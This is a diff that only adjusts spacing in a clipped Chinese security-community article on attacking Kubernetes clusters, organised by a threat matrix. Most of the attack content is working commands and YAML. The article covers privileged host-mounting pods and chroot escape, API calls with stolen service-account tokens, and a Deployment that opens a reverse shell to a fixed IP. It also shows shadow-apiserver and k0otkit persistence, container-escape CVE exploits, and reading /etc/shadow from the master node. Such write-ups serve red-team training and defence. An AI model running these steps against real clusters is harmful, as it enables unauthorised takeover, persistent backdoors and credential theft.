@@ -1,5 +1,5 @@
 ---
-title: 云原生之Kubernetes安全 - 先知社区
+title: 云原生之 Kubernetes 安全 - 先知社区
 url: https://xz.aliyun.com/t/10745?time__1311=mq%2BxB7DQGQG%3D9D0H3bDyiYD8062RRfrD
 clipped_at: 2024-03-27 00:48:31
 category: default
@@ -8,26 +8,26 @@ tags:
 ---
 
 
-# 云原生之Kubernetes安全 - 先知社区
+# 云原生之 Kubernetes 安全 - 先知社区
 
 随着越来越多企业开始上云的步伐，在攻防演练中常常碰到云相关的场景，例如：公有云、私有云、混合云、虚拟化集群等。以往渗透路径是「外网突破 -> 提权 -> 权限维持 -> 信息收集 -> 横向移动 -> 循环收集信息」，直到获得重要目标系统。但随着业务上云以及虚拟化技术的引入改变了这种格局，也打开了新的入侵路径，例如：
 
 -   通过虚拟机攻击云管理平台，利用管理平台控制所有机器
--   通过容器进行逃逸，从而控制宿主机以及横向渗透到K8s Master节点控制所有容器
--   利用KVM-QEMU/执行逃逸获取宿主机，进入物理网络横向移动控制云平台  
-    目前互联网上针对云原生场景下的攻击手法零零散散的较多，仅有一些厂商发布过相关矩阵技术，但没有过多的细节展示，本文基于微软发布的Kubernetes威胁矩阵进行扩展，介绍相关的具体攻击方法。  
+-   通过容器进行逃逸，从而控制宿主机以及横向渗透到 K8s Master 节点控制所有容器
+-   利用 KVM-QEMU/执行逃逸获取宿主机，进入物理网络横向移动控制云平台  
+    目前互联网上针对云原生场景下的攻击手法零零散散的较多，仅有一些厂商发布过相关矩阵技术，但没有过多的细节展示，本文基于微软发布的 Kubernetes 威胁矩阵进行扩展，介绍相关的具体攻击方法。  
     [![](assets/1711471711-5ca06a4c6f8c1224d0cf7c5688c24c1f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211230191129-3cf3693a-6961-1.png)  
     **红色标志是攻击者最为关注的技术点。**  
     \## 初始访问
--   API Server未授权访问
--   kubelet未授权访问
+-   API Server 未授权访问
+-   kubelet 未授权访问
 -   Docker Daemon 公网暴露
 -   K8s configfile 泄露  
-    \### API Server未授权访问  
-    API Server作为K8s集群的管理入口，通常使用 8080 和 6443 端口，其中 8080 端口无需认证，6443 端口需要认证且有TLS 保护。如果开发者使用 8080 端口，并将其暴露在公网上，攻击者就可以通过该端口的API，直接对集群下发指令。  
-    另一种场景是运维人员配置不当，将"system:anonymous"用户绑定到"cluster-admin"用户组，从而使6443端口允许匿名用户以管理员权限向集群内部下发指令。  
+    \### API Server 未授权访问  
+    API Server 作为 K8s 集群的管理入口，通常使用 8080 和 6443 端口，其中 8080 端口无需认证，6443 端口需要认证且有 TLS 保护。如果开发者使用 8080 端口，并将其暴露在公网上，攻击者就可以通过该端口的 API，直接对集群下发指令。  
+    另一种场景是运维人员配置不当，将"system:anonymous"用户绑定到"cluster-admin"用户组，从而使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。  
     \`\`\`css  
-    #查看pods  
+    #查看 pods  
     [https://192.168.4.110:6443/api/v1/namespaces/default/pods?limit=500](https://192.168.4.110:6443/api/v1/namespaces/default/pods?limit=500)
 
 # 创建特权容器
@@ -55,17 +55,17 @@ K8s configfile作为K8s集群的管理凭证，其中包含有关K8s集群的详
 拿到K8s configfile完整利用流程：
 K8s configfile --> 创建后门Pod/挂载主机路径 --> 通过Kubectl进入容器 --> 利用挂载目录逃逸。
 ```css
-#Linux安装kubectl
+#Linux 安装 kubectl
 curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
 sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
 
-#内容放入config、或指定选项，需要修改Server地址
+#内容放入 config、或指定选项，需要修改 Server 地址
 kubectl --kubeconfig k8s.yaml
 
 #获取已接取的镜像
 kubectl get pods --all-namespaces --insecure-skip-tls-verify=true -o jsonpath="{..image}" |tr -s '[[:space:]]' '\n' |sort |uniq -c
 
-#创建Pod pod.yaml，将宿主机根目录挂载host文件
+#创建 Pod pod.yaml，将宿主机根目录挂载 host 文件
 apiVersion: v1
 kind: Pod
 metadata:
@@ -83,13 +83,13 @@ spec:
       path: /
       type: Directory
 
-#在default命名空间中创建pod
+#在 default 命名空间中创建 pod
 kubectl apply -f pod.yaml -n default --insecure-skip-tls-verify=true
 
 #进入容器中
 kubectl exec -it test-444 bash -n default --insecure-skip-tls-verify=true
 
-#切换bash，逃逸成功
+#切换 bash，逃逸成功
 cd /host
 chroot ./ bash
 ````
@@ -152,10 +152,10 @@ export TOKEN=$(cat ${SERVICEACCOUNT}/token)
 # CACERT 路径
 export CACERT=${SERVICEACCOUNT}/ca.crt
 
-执行以下命令查看当前集群中所有Namespaces。
+执行以下命令查看当前集群中所有 Namespaces。
 curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces
 
-#写入yaml,创建特权Pod
+#写入 yaml，创建特权 Pod
 cat > nginx-pod.yaml << EOF
 apiVersion: v1
 kind: Pod
@@ -175,7 +175,7 @@ spec:
       type: Directory
 EOF
 
-#创建pod
+#创建 pod
 curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -k ${APISERVER}/api/v1/namespaces/default/pods -X POST --header 'content-type: application/yaml' --data-binary @nginx-pod.yaml
 
 #查看信息
@@ -208,13 +208,13 @@ api/v1/namespaces/default/pods/nginx-deployment-66b6c48dd5-4djlm/exec?command=ls
 ```plain
 #dep.yaml
 apiVersion: apps/v1
-kind: Deployment        #确保在任何时候都有特定数量的Pod副本处于运行状态
+kind: Deployment        #确保在任何时候都有特定数量的 Pod 副本处于运行状态
 metadata:
   name: nginx-deploy
   labels:
     k8s-app: nginx-demo
 spec:
-  replicas: 3       #指定Pod副本数量
+  replicas: 3       #指定 Pod 副本数量
   selector:
     matchLabels:
       app: nginx
@@ -229,7 +229,7 @@ spec:
       - name: nginx
         image: nginx:1.7.9
         imagePullPolicy: IfNotPresent
-        command: ["bash"]   #反弹Shell
+        command: ["bash"]   #反弹 Shell
         args: ["-c", "bash -i >& /dev/tcp/192.168.238.130/4242 0>&1"]
         securityContext:
           privileged: true  #特权模式
@@ -256,7 +256,7 @@ Shadow API Server的配置与利用：
 配置文件路径：
 /etc/systemd/system/kube-apiserver-test.service
 
-#一键部署Shadow apiserver
+#一键部署 Shadow apiserver
 ./cdk run k8s-shadow-apiserver default
 
 #一键部署将在配置文件中添加了如下选项：
@@ -267,7 +267,7 @@ Shadow API Server的配置与利用：
 --anonymous-auth=true
 --authorization-mode=AlwaysAllow
 
-#kcurl访问与利用
+#kcurl 访问与利用
 ./cdk kcurl anonymous get https://192.168.1.44:9443/api/v1/secrets
 ```
 
@@ -291,7 +291,7 @@ K0otkit使用到的技术：
 ./handle\_multi\_reverse\_shell.sh
 
 ````plain
-k0otkit.sh的内容复制到master执行：
+k0otkit.sh 的内容复制到 master 执行：
 ```css
 volume_name=cache
 mount_path=/var/kube-proxy-cache
@@ -323,13 +323,13 @@ kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy
   | kubectl --kubeconfig /root/.kube/config replace -f -
 ````
 
-### cronjob持久化
+### cronjob 持久化
 
 CronJob 用于执行周期性的动作，例如备份、报告生成等，攻击者可以利用此功能持久化。
 
 ```plain
 apiVersion: batch/v1
-kind: CronJob       #使用CronJob对象
+kind: CronJob       #使用 CronJob 对象
 metadata:
   name: hello
 spec:
@@ -345,18 +345,18 @@ spec:
             command:
             - /bin/sh
             - -c
-            - #反弹Shell或者木马  
+            - #反弹 Shell 或者木马  
           restartPolicy: OnFailure
 ```
 
 ## 权限提升
 
 -   特权容器逃逸
--   Docker漏洞
--   Linux Capabilities逃逸  
+-   Docker 漏洞
+-   Linux Capabilities 逃逸  
     \### 特权容器逃逸  
-    当容器启动加上--privileged选项时，容器可以访问宿主机上所有设备。  
-    而K8s配置文件启用了privileged: true:  
+    当容器启动加上--privileged 选项时，容器可以访问宿主机上所有设备。  
+    而 K8s 配置文件启用了 privileged: true:  
     \`\`\`css  
     spec:  
     containers:
@@ -367,9 +367,9 @@ spec:
     
     ````plain
     实战案例：
-    通过漏洞获取WebShell，查看根目录存在.dockerenv，可通过fdisk -l查看磁盘目录，进行挂载目录逃逸:
+    通过漏洞获取 WebShell，查看根目录存在.dockerenv，可通过 fdisk -l 查看磁盘目录，进行挂载目录逃逸：
     ```css
-    #Webshell下操作
+    #Webshell 下操作
     fdisk -l
     mkdir /tmp/test
     mount /dev/sda3 /tmp/test
@@ -377,11 +377,11 @@ spec:
     ````
     
     [![](assets/1711471711-c633261b9b3257a5cb6a5088df184785.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211230192224-c344e882-6962-1.png)  
-    \### Docker漏洞  
-    这里介绍两个知名的docker逃逸漏洞。  
+    \### Docker 漏洞  
+    这里介绍两个知名的 docker 逃逸漏洞。  
     \#### CVE-2020-15257  
-    在Containerd 1.3.9版本之前和1.4.0~1.4.2版本，使用了--host网络模式，会造成containerd-shim API暴露，通过调用API功能实现逃逸。  
-    Host模式特点：
+    在 Containerd 1.3.9 版本之前和 1.4.0~1.4.2 版本，使用了--host 网络模式，会造成 containerd-shim API 暴露，通过调用 API 功能实现逃逸。  
+    Host 模式特点：
 -   共享宿主机网络
 -   网络性能无损耗
 -   各容器网络无隔离
@@ -390,21 +390,21 @@ spec:
 -   不支持端口映射
     
     ```plain
-    #判断是否使用host模式
+    #判断是否使用 host 模式
     cat /proc/net/unix | grep 'containerd-shim'
     ```
     
     [![](assets/1711471711-e603f37e5ed5a2dbfb7d3db6d67647b1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211230192346-f3f41b74-6962-1.png)
     
     ```plain
-    #反弹宿主机的shell到远端服务器
+    #反弹宿主机的 shell 到远端服务器
     ./cdk_linux_386 run shim-pwn reverse 192.168.238.159 4455
     ```
     
     [![](assets/1711471711-8be470332bec539e61e53284cadc5c0b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211230192418-06f92066-6963-1.png)  
     \#### CVE-2019-5736  
-    当runc动态编译时，会从容器镜像中载入动态链接库，导致加载恶意动态库；当打开/prco/self/exe即runc时，会执行恶意动态链接库中的恶意程序，由于恶意程序继承runc打开的文件句柄，可以通过该文件句柄替换host上的runc。  
-    此后，再次执行runc相关的命令，则会产生逃逸。
+    当 runc 动态编译时，会从容器镜像中载入动态链接库，导致加载恶意动态库；当打开/prco/self/exe 即 runc 时，会执行恶意动态链接库中的恶意程序，由于恶意程序继承 runc 打开的文件句柄，可以通过该文件句柄替换 host 上的 runc。  
+    此后，再次执行 runc 相关的命令，则会产生逃逸。
 
 版本漏洞：  
 docker version <=18.09.2  
@@ -413,39 +413,39 @@ RunC version <=1.0-rc6
 利用过程：
 
 ```plain
-#下载POC
+#下载 POC
 https://github.com/Frichetten/CVE-2019-5736-PoC
 
 #编译
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
 ```
 
-利用成功是将/etc/shadow文件复制到/tmp/目录下
+利用成功是将/etc/shadow 文件复制到/tmp/目录下
 
 ```plain
-#将编译的main复制到docker容器中，实战是用WebShell上传
+#将编译的 main 复制到 docker 容器中，实战是用 WebShell 上传
 docker cp main name:/home
 cd /home/
 chmod 777 main
 ./main
 #此时等管理员进入容器将触发：
 ![](https://xzfile.aliyuncs.com/media/upload/picture/20211230192525-2f3e2828-6963-1.png)
-或将第16行改为反弹Shell，获得宿主机权限。
+或将第 16 行改为反弹 Shell，获得宿主机权限。
 ![](https://xzfile.aliyuncs.com/media/upload/picture/20211230192551-3e8541e0-6963-1.png)
 ```
 
 ### Capabilities
 
-Capabilities是Linux一种安全机制，是在Linux内核2.2之后引入的，主要作用是权限更细粒度的控制。容器社区一直在努力将纵深防御、最小权限等理念和原则落地。  
-目前Docker已经将Capabilities黑名单机制改为了默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。
+Capabilities 是 Linux 一种安全机制，是在 Linux 内核 2.2 之后引入的，主要作用是权限更细粒度的控制。容器社区一直在努力将纵深防御、最小权限等理念和原则落地。  
+目前 Docker 已经将 Capabilities 黑名单机制改为了默认禁止所有 Capabilities，再以白名单方式赋予容器运行所需的最小权限。
 
 ```plain
-#查看Capabilities
+#查看 Capabilities
 cat /proc/self/status | grep CapEff
 capsh --print
 ```
 
-Capabilities允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等
+Capabilities 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等
 
 -   cap\_sys\_ptrace-container
 -   cap\_sys\_admin-container
@@ -453,31 +453,31 @@ Capabilities允许执行系统管理任务，如加载或卸载文件系统、�
     实际场景不多，逃逸方法参考挂载目录方式。  
     \## 探测
 -   内网扫描
--   K8s常用端口探测
+-   K8s 常用端口探测
 -   集群内部网络  
     \### 集群内网扫描  
-    Kubernetes的网络中存在4种主要类型的通信
--   同一Pod内的容器间通信
--   各Pod彼此间通信
--   Pod与Service间的通信
--   集群外部的流量与Service间的通信。  
-    所以和常规内网渗透无区别，nmap、masscan等扫描  
-    \### K8s常用端口探测  
+    Kubernetes 的网络中存在 4 种主要类型的通信
+-   同一 Pod 内的容器间通信
+-   各 Pod 彼此间通信
+-   Pod 与 Service 间的通信
+-   集群外部的流量与 Service 间的通信。  
+    所以和常规内网渗透无区别，nmap、masscan 等扫描  
+    \### K8s 常用端口探测  
     [![](assets/1711471711-7a4f4395161abc874a956b6f4f1c8c7a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211230192814-93b19632-6963-1.png)  
     \### 集群内部网络
--   Flannel网络插件默认使用10.244.0.0/16网络
--   Calico默认使用192.168.0.0/16网络  
+-   Flannel 网络插件默认使用 10.244.0.0/16 网络
+-   Calico 默认使用 192.168.0.0/16 网络  
     \## 横向移动
--   污点(Taint)横向渗透
+-   污点 (Taint) 横向渗透
 
-### 污点(Taint)横向渗透
+### 污点 (Taint) 横向渗透
 
-污点是K8s高级调度的特性，用于限制哪些Pod可以被调度到某一个节点。一般主节点包含一个污点，这个污点是阻止Pod调度到主节点上面，除非有Pod能容忍这个污点。而通常容忍这个污点的 Pod都是系统级别的Pod，例如kube-system  
+污点是 K8s 高级调度的特性，用于限制哪些 Pod 可以被调度到某一个节点。一般主节点包含一个污点，这个污点是阻止 Pod 调度到主节点上面，除非有 Pod 能容忍这个污点。而通常容忍这个污点的 Pod 都是系统级别的 Pod，例如 kube-system  
 [![](assets/1711471711-cc4056425f0cf1f6345f62388577c23a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211230192916-b8c1994a-6963-1.png)  
-**—个pod只有容忍了节点的污点，才能被调度到该节点上面**
+**—个 pod 只有容忍了节点的污点，才能被调度到该节点上面**
 
 ```plain
-#Node中查看节点信息
+#Node 中查看节点信息
 [root@node1 ~]# kubectl get nodes
 NAME              STATUS                     ROLES    AGE   VERSION
 192.168.238.129   Ready,SchedulingDisabled   master   30d   v1.21.0
@@ -485,7 +485,7 @@ NAME              STATUS                     ROLES    AGE   VERSION
 192.168.238.131   Ready                      node     30d   v1.21.0
 192.168.238.132   Ready                      node     30d   v1.21.0
 
-#确认Master节点的容忍度
+#确认 Master 节点的容忍度
 [root@node1 ~]# kubectl describe nodes 192.168.238.130
 Name:               192.168.238.130
 Roles:              master
@@ -504,10 +504,10 @@ Annotations:        flannel.alpha.coreos.com/backend-data: {"VtepMAC":"66:3b:20:
 CreationTimestamp:  Tue, 14 Sep 2021 17:41:30 +0800
 Taints:             node.kubernetes.io/unschedulable:NoSchedule
 
-#创建带有容忍参数的Pod
+#创建带有容忍参数的 Pod
 kubectl create -f control-master.yaml
 
-#control-master.yaml内容：
+#control-master.yaml 内容：
 apiVersion: v1
 kind: Pod
 metadata:
@@ -530,7 +530,7 @@ spec:
       path: /
       type: Directory
 ![](https://xzfile.aliyuncs.com/media/upload/picture/20211230193004-d5616706-6963-1.png)
-#获得Master控制端
+#获得 Master 控制端
 kubectl exec control-master-15 -it bash
 chroot /master bash
 cat /etc/shadow
@@ -565,5 +565,5 @@ cat /etc/shadow
 6.CVE-2019-5736-Poc  
 [https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)
 
-7.修复Docker操作系统命令注入漏洞公告（CVE-2019-5736）  
+7.修复 Docker 操作系统命令注入漏洞公告（CVE-2019-5736）  
 [https://support.huaweicloud.com/bulletin-cce/cce\_bulletin\_0015.html](https://support.huaweicloud.com/bulletin-cce/cce_bulletin_0015.html)
